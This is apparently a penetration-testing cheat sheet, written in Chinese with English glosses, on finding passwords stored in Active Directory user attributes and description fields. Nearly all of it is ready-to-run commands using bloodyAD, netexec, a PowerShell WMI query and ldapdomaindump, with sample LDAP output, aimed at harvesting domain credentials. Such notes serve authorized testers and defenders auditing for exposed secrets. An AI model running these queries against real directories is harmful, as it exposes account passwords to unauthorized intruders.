# 密码 - AD 用户注释 (AD User Comment)

在大多数 Active Directory 架构中，似乎有 3-4 个常见的字段：`UserPassword`、`UnixUserPassword`、`unicodePwd` 和 `msSFU30Password`。

* Windows/Linux 命令

    ```ps1
    bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(|(userPassword=*)(unixUserPassword=*)(unicodePassword=*)(description=*))' --attr userPassword,unixUserPassword,unicodePwd,description
    ```

* 用户描述中的密码 (Password in User Description)

    ```powershell
    netexec ldap domain.lab -u 'username' -p 'password' -M user-desc
    netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users
    GET-DESC... 10.0.2.11       389    dc01    [+] Found following users: 
    GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain
    GET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account
    ```

* 从 LDAP 中的所有用户获取 `unixUserPassword` 属性 (Get `unixUserPassword` attribute from all users in ldap)

    ```ps1
    nxc ldap 10.10.10.10 -u user -p pass -M get-unixUserPassword -M getUserPassword
    ```

* 原生 Powershell 命令 (Native Powershell command)

    ```powershell
    Get-WmiObject -Class Win32_UserAccount -Filter "Domain='COMPANYDOMAIN' AND Disabled='False'" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID
    ```

* 导出 Active Directory 并使用 `grep` 搜索内容 (Dump the Active Directory and `grep` the content)

    ```powershell
    ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
    ```
